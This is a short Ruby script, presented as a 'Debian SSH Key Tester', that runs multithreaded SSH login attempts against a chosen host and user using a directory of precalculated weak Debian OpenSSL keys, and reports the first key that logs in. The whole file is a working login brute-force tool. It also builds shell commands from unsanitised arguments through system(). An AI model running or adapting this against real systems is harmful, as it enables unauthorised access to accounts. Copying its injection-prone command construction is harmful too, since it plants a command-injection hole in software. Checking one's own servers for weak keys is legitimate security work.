#!/usr/bin/ruby
#
# Debian SSH Key Tester
# L4teral <l4teral [at] gmail com>
#
# This tool helps to find user accounts with weak SSH keys
# that should be regenerated with an unaffected version
# of openssl.
# 
# You will need the precalculated keys provided by HD Moore
# See http://metasploit.com/users/hdm/tools/debian-openssl/
# for further information.
#
# Usage:
# debian_openssh_key_test.rb <host> <user> <keydir>
#

require 'thread'

THREADCOUNT = 10
KEYSPERCONNECT = 3

queue = Queue.new
threads = []
keyfiles = []

host = ARGV.shift or raise "no host given!"
user = ARGV.shift or raise "no user given!"
keysdir = ARGV.shift or raise "no key dir given!"

Dir.new(keysdir).each do |f|
  if f =~ /\d+$/ then
    keyfiles << f
    queue << f
  end
end

totalkeys = queue.length
currentkey = 1

THREADCOUNT.times do |i|
  threads << Thread.new(i) do |j|
    while !queue.empty?
      keys = []
      KEYSPERCONNECT.times { keys << queue.pop unless queue.empty? }
      keys.map! { |f| f = File.join(keysdir, f) }
      keys.each do |k|
        puts "testing key #{currentkey}/#{totalkeys} #{k}..."
        currentkey += 1
      end
      system "ssh -l #{user} -o PasswordAuthentication=no -i #{keys.join(" -i ")} #{host} \"exit\" &>/dev/null"
      if $? == 0 then
        keys.each do |k|
          system "ssh -l #{user} -o PasswordAuthentication=no -i #{k} #{host} \"exit\" &>/dev/null"
          if $? == 0 then
            puts "KEYFILE FOUND: \n#{k}"
            exit
          end
        end
      end
    end
  end
end

trap("SIGINT") do
  threads.each { |t| t.exit() } 
  exit
end

threads.each { |t| t.join }

